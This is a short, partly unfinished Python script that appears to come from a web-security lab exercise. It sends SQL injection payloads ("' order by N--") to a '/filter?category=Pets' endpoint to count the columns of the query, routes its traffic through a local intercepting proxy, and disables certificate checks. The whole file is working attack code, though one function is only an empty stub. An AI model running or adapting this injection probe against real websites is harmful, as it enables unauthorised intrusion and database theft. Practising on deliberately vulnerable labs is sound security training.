import requests
import urllib3
from bs4 import BeautifulSoup
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'https':'127.0.0.1:8080'}

def exploit(url):
    uri = '/filter?category=Pets'
    for i in range(1,50):
        sql_payload = f"' order by {i}--"
        r = requests.get(url+uri+sql_payload, verify=False,proxies=proxies)
        res = r.text
        print(i)
        if "Internal Server Error" in res:
            print(f"error is at {i - 1}")
            return i - 1
        # i = i + 1
    return False

def get_data_type(num, url):
    pass



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        # payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    session = requests.Session()
    if exploit(url):
        print('[+] SQL injection successful!')
    else:
        print('[-] SQL injection unsuccessful.')

